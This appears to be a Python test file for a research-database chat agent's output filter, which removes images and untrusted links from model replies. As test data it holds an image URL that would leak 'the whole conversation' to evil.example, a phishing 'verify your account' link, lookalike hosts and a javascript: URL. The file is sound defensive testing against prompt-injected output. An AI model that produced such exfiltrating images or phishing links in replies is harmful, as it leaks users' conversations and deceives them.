"""
What a reply may make the user's browser do. These hold whatever the model was talked into.
"""
from conftest import ScriptedModel, reply
from sead_agent.reply_guard import guard_reply

HOSTS = ["sead.se", "doi.org", "sead.local"]


def test_images_are_never_rendered():
    text, removed = guard_reply("Here: ![chart](https://evil.example/p.png?q=the+whole+conversation) done", HOSTS)

    assert text == "Here: chart done"
    assert removed == ["image https://evil.example/p.png?q=the+whole+conversation"]


def test_an_image_on_our_own_host_is_not_rendered_either():
    #Nothing the agent says needs a picture, and an image needs no click to be fetched
    text, _ = guard_reply("![map](https://browser.sead.se/map.png)", HOSTS)

    assert text == "map"


def test_a_link_to_an_unknown_host_becomes_its_text():
    text, removed = guard_reply("Please [verify your account](http://evil.example/login) first.", HOSTS)

    assert text == "Please verify your account first."
    assert removed == ["link http://evil.example/login"]


def test_shortcuts_relative_links_and_trusted_hosts_stay():
    original = ("Switch to the [table](#sead-action/set_result_view?view=table), "
                "open [the site](/site/2), read [the paper](https://doi.org/10.1000/xyz) "
                "or [browse](https://browser.sead.se/site/2).")

    text, removed = guard_reply(original, HOSTS)

    assert text == original
    assert removed == []


def test_lookalike_hosts_are_not_trusted():
    for url in ("https://sead.se.evil.example/", "https://notsead.se/", "//evil.example/x", "javascript:alert(1)"):
        text, removed = guard_reply("[x]("+url+")", HOSTS)
        assert text == "x", url
        assert removed, url


def test_autolinks_to_unknown_hosts_lose_their_brackets():
    text, removed = guard_reply("Go to <https://evil.example/login> or <https://doi.org/10.1/x>", HOSTS)

    assert text == "Go to https://evil.example/login or <https://doi.org/10.1/x>"
    assert removed == ["link https://evil.example/login"]


def test_reference_style_links_and_images_lose_their_definitions():
    original = "See [the form][1] and ![pixel][2].\n\n[1]: https://evil.example/form\n[2]: https://evil.example/p.png"

    text, removed = guard_reply(original, HOSTS)

    assert "evil.example" not in text
    assert "![" not in text
    assert len(removed) >= 2


def test_the_service_filters_what_it_sends(make_client):
    scripted = ScriptedModel(reply("Click [here](https://evil.example/login) ![x](https://evil.example/x.png)"))
    client = make_client(scripted)

    answer = client.post("/message", json={"input": "hi"}, headers={"Origin": "https://sead.local"}).json()

    assert answer["output_text"] == "Click here x"


def test_the_page_the_chatbox_is_on_may_be_linked(make_client):
    scripted = ScriptedModel(reply("Open [the site](https://sead.local/site/2)."))
    client = make_client(scripted)

    answer = client.post("/message", json={"input": "hi"}, headers={"Origin": "https://sead.local"}).json()

    assert answer["output_text"] == "Open [the site](https://sead.local/site/2)."
